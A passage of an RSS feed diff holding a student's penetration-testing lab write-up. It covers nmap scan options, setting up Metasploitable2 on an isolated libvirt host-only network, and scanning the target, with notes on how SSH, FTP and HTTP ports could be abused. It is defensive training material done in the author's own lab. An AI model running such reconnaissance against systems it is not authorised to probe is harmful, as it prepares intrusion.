+Options range from the slowest (T0) to the fastest (T5), or from paranoid to insane, as described on nmap.org (<a href="https://nmap.org/book/performance-timing-templates.html">nmap.org a.</a>).</p>
+<p>The <code>-A</code> stands for aggressive scan options. Currently it is a quick way to enable the following flags: <code>-o -sV -sC --traceroute</code> without the need to type all of them out. These flags enable OS detection, version scanning, script scanning and traceroute (<a href="https://nmap.org/book/man-misc-options.html">nmap.org b.</a>).</p>
+<p>The scan shows all of the ports scanned are currently closed.</p>
+<hr>
+<h3 id="d-starting-ssh-and-mariadb-and-scanning-the-ports">d) Starting ssh and MariaDB and scanning the ports</h3>
+<p>I started ssh <code>sudo systemctl start ssh</code> and MariaDB <code>sudo systemctl start mariadb</code>.
+After which I re-did the nmap scan. It now report back two open ports and the versions of the services.</p>
+<p><img src="img/h1/kali_daemons.png" alt="Two open ports on nmap scan"></p>
+<p>By enabling the two services, I opened up two ports tied to each of the services.</p>
+<hr>
+<h3 id="e-importing-the-metasploitable2-image-to-a-virtual-machine">e) Importing the Metasploitable2 image to a virtual machine</h3>
+<p>I downloaded and imported the metasploitable2 image to a virtual machine. The installation went smoothly.</p>
+<hr>
+<h3 id="f-connecting-the-two-virtual-machines-via-virtual-network">f) Connecting the two virtual machines via. virtual network</h3>
+<p>I use two networks for the machines.</p>
+<p>The default NAT network for kali which has internet access.
+Host-only network that both of the machines use to connect to each other and be off the internet.</p>
+<p>I looked for a quick guide on the networking xmls and came across a <a href="https://amoldighe.github.io/2017/12/20/kvm-networking/">kvm-networking guide</a> by Amol Dighe,
+which outlined what I wanted to do nicely. Here I only needed this small snippet:</p>
+<pre><code>&lt;network&gt;
+    &lt;name&gt;hostonly&lt;/name&gt;
+    &lt;bridge name=&quot;virbr-hostonly&quot; stp=&quot;on&quot; delay=&quot;0&quot;/&gt;
+    &lt;ip address=&quot;192.168.100.1&quot; netmask=&quot;255.255.255.0&quot;&gt;
+        &lt;dhcp&gt;
+            &lt;range start=&quot;192.168.100.2&quot; end=&quot;192.168.100.254&quot;/&gt;
+        &lt;/dhcp&gt;
+    &lt;/ip&gt;
+&lt;/network&gt;
+</code></pre>
+<p>then I used <code>sudo virsh net-define /path/to/network.xml</code> to add the virtual network to libvirt.</p>
+<p>and enabled autostart with <code>sudo virsh net-autostart hostonly</code></p>
+<p>(Amol Dighe 2017.)</p>
+<hr>
+<h3 id="g-testing-the-virtual-network-using-nmap">g) Testing the virtual network using nmap</h3>
+<p><code>nmap -sn</code> seems to find the target machine just fine.</p>
+<p><img src="img/h1/kali_ping.png" alt="Successful ping"></p>
+<p>And we can load the front page as well.</p>
+<p><img src="img/h1/kali_sploit.png" alt="Metasploitable frontpage"></p>
+<hr>
+<h3 id="h-scanning-and-analyzing-the-ports-on-the-metasploitable2-machine">h) Scanning and analyzing the ports on the metasploitable2 machine.</h3>
+<p>Scanning the target machine with <code>nmap -A -T4 -p-</code> gives multiple open ports, of which, most services are out of date.</p>
+<p>For the three ports to focus I picked:</p>
+<h4 id="22--ssh">22 / SSH</h4>
+<p>Could be used to gain remote access.</p>
+<h4 id="21--ftp">21 / FTP</h4>
+<p>Could be used to upload malicious files.</p>
+<h4 id="80--http">80 / HTTP</h4>
+<p>Could be a login/admin page or other possible avenue for user inputs.</p>
+<hr>
+<h3 id="sources-used">Sources used</h3>
+<p>The assignment which this page is based on can be found here: <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
+<p><a href="https://darknetdiaries.com/episode/144/">Darknet Diaries EP144</a></p>
+<p><a href="https://lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf">Hutchins et al 2011.</a></p>
+<p><a href="https://finlex.fi/fi/oikeuskaytanto/korkein-oikeus/ennakkopaatokset/2003/36#OT2_OT0_OT0">KKO 2003:36</a></p>
+<p><a href="https://nmap.org/book/performance-timing-templates.html">nmap.org a.</a></p>
+<p><a href="https://nmap.org/book/man-misc-options.html">nmap.org b.</a></p>
+<p><a href="https://amoldighe.github.io/2017/12/20/kvm-networking/">Amol Dighe 2017.</a></p>
+<hr>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
